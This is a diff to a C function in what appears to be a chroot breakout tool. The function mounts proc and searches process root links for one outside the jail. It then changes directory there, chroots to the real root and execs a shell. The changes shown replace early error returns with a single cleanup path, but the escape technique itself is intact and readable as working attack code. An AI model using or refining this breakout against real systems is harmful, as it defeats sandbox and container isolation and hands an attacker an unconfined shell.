@@ -610,6 +610,7 @@ int mountproc(char *dir)
     DIR *dird;
     struct dirent *pdirent;
     char *rootname; // "/proc/$pid$/root"
+    int return_code = 0xDEADBEEF;
 #if __sun
     char optbuf[0x400];
     char slashdir[255];
@@ -619,7 +620,7 @@ int mountproc(char *dir)
     if ((rootname = malloc(8+sizeof(unsigned long long)+strlen(dir))) == NULL)
     {
 	printf("[-] Error allocating memory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     memset(rootname, 0, 8+sizeof(unsigned long long)+strlen(dir));
     sprintf(rootname, "/%s/%llu/root", dir, (unsigned long long)pid);
@@ -631,7 +632,7 @@ int mountproc(char *dir)
 	if (mkdir(dir, 0555))
 	{
 	    printf("[-] error creating %s\n", dir);
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
     }
     
@@ -648,19 +649,19 @@ int mountproc(char *dir)
 #endif
 	{
 	    printf("[-] error mounting %s: %s\n", dir, strerror(errno));
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	if ((err = stat(rootname, &ownstat)) != 0) 
 	{
 	    printf("[-] cannot find my own root: %s\n", strerror(errno));
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
     }
 
     if ((dird = opendir(dir)) == NULL)
     {
 	printf("[-] error opening %s: %s\n", dir, strerror(errno));
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     while ((pdirent = readdir(dird)) != NULL)
@@ -669,7 +670,7 @@ int mountproc(char *dir)
 	    8+strlen(dir)+strlen(pdirent->d_name))) == NULL)
 	{
 	    printf("[-] Error reallocating memory\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	sprintf(rootname, "/%s/%s/root", dir, pdirent->d_name);
 	if ((strncmp(pdirent->d_name, ".", 1)) && 
@@ -687,30 +688,34 @@ int mountproc(char *dir)
     if (fchdir(dirfd(dird)))
     {
 	printf("[-] cannot change directory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 	
     printf("[+] chrooting to real root\n");
     if (chroot("."))
     {
 	printf("[-] chroot failed\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     
-    free(rootname);
     for (i=0; i<SHELLNUM; i++)
     {
 	if ((err = stat(shells[i], &ownstat)) == 0)
 	{
 #if !__sun
-            return execve(shells[i], NULL, NULL);
+            return_code = execve(shells[i], NULL, NULL);
 #else
-            return execl(shells[i], NULL, NULL);
+            return_code = execl(shells[i], NULL, NULL);
 #endif
+	    goto safe_exit;
 	}
     }
 
-    return 0;
+    return_code = 0;
+
+safe_exit:
+    if (rootname) free(rootname);
+    return return_code;
 }
 #endif
 
